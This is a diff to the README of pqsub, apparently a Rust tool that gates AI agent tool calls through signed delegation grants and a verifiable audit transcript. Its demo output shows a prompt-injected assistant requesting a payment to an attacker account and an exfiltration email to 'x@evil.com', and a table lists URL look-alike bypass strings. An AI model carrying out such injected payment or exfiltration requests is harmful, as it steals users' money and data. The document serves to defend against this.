@@ -41,19 +41,54 @@ pqsub answers **yes**, with post-quantum signatures. An agent that has been prom
 | A buggy or dishonest executor runs a forbidden call anyway | It happened — but it's provable | `EXECUTED_UNAUTHORIZED`, exit 2 |
 | Anyone edits one bit of the transcript | — | `INVALID [BAD_SIGNATURE]`, exit 2 |
 
+[![85-second demo: the gate refuses an injected payment and an exfiltration email, and the independent verifier audits the transcript](docs/media/pqsub-demo-poster.png)](docs/media/pqsub-demo.mp4)
+
+*An 85-second demo: a prompt-injected assistant asks for an attacker payment and a data-exfiltration email. The executor gates refuse both, and the independent verifier shows that every executed call was authorized.* The video is rendered from the real output of `./examples/demo-banking.sh` by [`scripts/render-demo-video.py`](scripts/render-demo-video.py). There is also a [version without narration](docs/media/pqsub-demo-clean.mp4) with [separate captions](docs/media/pqsub-demo.srt).
+
+## Why this exists
+
+Prompts, filters and monitoring make agent hijacking less likely, but cannot stop a hijacked agent from *asking* for an unauthorized action. Permission checks that run inside the agent process fail along with that process. pqsub assumes the agent is fully compromised: authorization is enforced by a gate in the executor that holds the credentials, and every attempt is recorded in a signed, hash-chained transcript that anyone can audit offline.
+
+> If tools are reachable only through executors that run the gate, then a prompt-injected agent cannot cause a side effect outside the authority delegated to it, and a third party can verify this from the transcript.
+
+More detail, including what is proven today and what is still assumed: [docs/POSITIONING.md](docs/POSITIONING.md).
+
 ## Verify it yourself in about 2 minutes
 
 You need [Rust (rustup)](https://rustup.rs). The pinned toolchain installs itself.
+
+**1. Clone:**
 
 ```bash
 git clone https://github.com/exocognosis/pqsub && cd pqsub
 ```
 
+**2. Run the whole scenario with one command.** It builds, delegates authority, lets a prompt-injected assistant request a legitimate payment, an attacker payment, a legitimate email and an exfiltration email, shows each gate decision, and then audits the resulting transcript with the independent verifier:
+
 ```bash
-cargo build --release --locked
+./examples/demo-banking.sh
 ```
 
-Audit the banking scenario above, using the **independent** verifier (a second implementation that shares no code with the producer):
+```text
+== 3. Each executor's gate decides before anything runs ==
+send_money pay the rent                EXECUTED                   {"amount":95000,"to":"DE89LANDLORD"}
+send_money injected: pay the attacker  REFUSED  CAVEAT_VIOLATION  {"amount":5000,"to":"GB00ATTACKER"}
+send_email notify the landlord         EXECUTED                   {"body":"Rent paid","to":"landlord@acme.com"}
+send_email injected: exfiltrate data   REFUSED  CAVEAT_VIOLATION  {"body":"account statements","to":"x@evil.com"}
+bank ledger: 1 payment(s)   mail outbox: 1 message(s)
+...
+== 4. Anyone with root.pub audits the transcript offline (independent verifier) ==
+BLOCKED                entry #3   call #2   reason=6  justified=true
+BLOCKED                entry #7   call #6   reason=6  justified=true
+VALID  8 entries  anchored=true  head=…  findings=2
+PROVED every executed call was authorized at execution time
+```
+
+Keys are freshly generated and signatures are hedged, so hashes differ on every run. The bank and mail tools are in-memory mocks; everything else is the real code path ([`banking_demo.rs`](crates/pqsub-cli/examples/banking_demo.rs)).
+
+### More checks
+
+The committed transcripts in [`examples/v2-audit/`](examples/v2-audit) are the same scenario as published test vectors, including a call nobody answered. Audit them with the **independent** verifier (a second implementation that shares no code with the producer):
 
 ```bash
 ./target/release/pqsub-verify audit --root examples/v2-audit/root.pub examples/v2-audit/honest-executor.pqst --require-authorized
@@ -81,7 +116,7 @@ Check every published test vector against the independent implementation:
 ./target/release/pqsub-verify vectors-v2 test-vectors/vectors-v2.json
 ```
 
-Run the whole test suite (68 tests, including exhaustive bit-flip and differential fuzz tests; about 90 s on an Apple M3):
+Run the whole test suite (75 tests, including exhaustive bit-flip and differential fuzz tests; about 90 s on an Apple M3):
 
 ```bash
 cargo test --workspace --locked --release
@@ -159,15 +194,16 @@ The point of the project is that its claims can be checked, not taken on trust.
 
 | Evidence | Result |
 |---|---|
-| Two independent implementations (different ML-DSA libraries, verifier written from spec only) | Agree on **all 186** published vector checks (37 v1, 149 v2) |
+| Two independent implementations (different ML-DSA libraries, verifier written from spec only) | Agree on **all 202** published vector checks (37 v1, 165 v2 including grant revocation) |
 | Exhaustive single-bit flips of a signed manifest (~28k bits) and a grant body (2,304 bits) | **Every flip detected**, with identical error codes from both implementations |
 | Differential fuzzing | 120k canonical-JSON inputs and 20k caveat evaluations; both implementations agree on every one |
 | Matcher bypass attempts | `..` path traversal, sibling-prefix paths, look-alike and userinfo URLs (`acme.com.evil.com`, `evil@acme.com`), malformed emails, non-canonical JSON: all rejected |
 | Delegation | A sub-grant that tries to widen its parent is rejected |
+| Revocation (v2.1) | Every bit flip of a signed revocation entry is detected identically by both implementations; unentitled revokers are ignored and revocations are not retroactive |
 | Reproducibility | The demo transcript and both vector files regenerate byte-for-byte |
 | Code hygiene | `#![forbid(unsafe_code)]`; `unwrap`, `expect` and `panic` denied in library code; clippy and rustfmt clean |
 
-**On independence:** the second implementation was written by a separate AI agent instance from the spec alone. That cuts down implementation bugs, but because the same model family wrote the spec and both implementations, a shared misreading of the spec isn't ruled out. Independent reimplementations in other languages, built from [`test-vectors/`](test-vectors) and [the spec](docs/V2_DESIGN.md), are very welcome.
+**On independence:** the second implementation, including its v2.1 revocation support, was written by a separate AI agent instance from the spec alone. That cuts down implementation bugs, but because the same model family wrote the spec and both implementations, a shared misreading of the spec isn't ruled out. Independent reimplementations in other languages, built from [`test-vectors/`](test-vectors) and [the spec](docs/V2_DESIGN.md), are very welcome.
 
 ## Performance
 
@@ -195,7 +231,8 @@ Being explicit about the limits:
 - It doesn't stop harmful actions that fall **within** the granted authority. A grant is only as good as its caveats.
 - It doesn't detect prompt injection; it limits what an injection can achieve.
 - The gate and executor are trusted to enforce. A dishonest executor isn't *prevented*; it is *caught* by the audit.
-- No confidentiality, information-flow control, trusted time, or revocation yet. Keys are not encrypted at rest.
+- Grants can be revoked (v2.1, recorded in the transcript), but agent keys and identities cannot, and the offline root cannot revoke its own grant. No transparency log yet.
+- No confidentiality, information-flow control or trusted time. Keys are not encrypted at rest.
 - Known open question: the offline audit doesn't yet check that the caller's and grant issuer's identity documents were still valid at receipt time (the live gate does check the caller). See [V2_DESIGN §14.12](docs/V2_DESIGN.md).
 
 ## Roadmap
@@ -204,7 +241,8 @@ Being explicit about the limits:
 - [x] **v2 P1** — delegation grants, caveats, tool calls, executor gate, signed receipts, offline audit, second implementation
 - [ ] **P2** — a gate in front of real [MCP](https://modelcontextprotocol.io) tool servers, a live banking attack demo, CLI commands to issue grants and make calls, a gate-latency benchmark
 - [ ] **P3** — evaluation on the [AgentDojo](https://github.com/ethz-spylab/agentdojo) prompt-injection benchmark
-- [ ] **P4** — revocation and a transparency log
+- [x] **v2.1** — grant revocation recorded in the transcript, effective from its position in the hash chain ([spec §14.13](docs/V2_DESIGN.md))
+- [ ] **P4** — key and identity revocation, and a transparency log
 - [ ] **P5** — write-up
 
 ## Use it
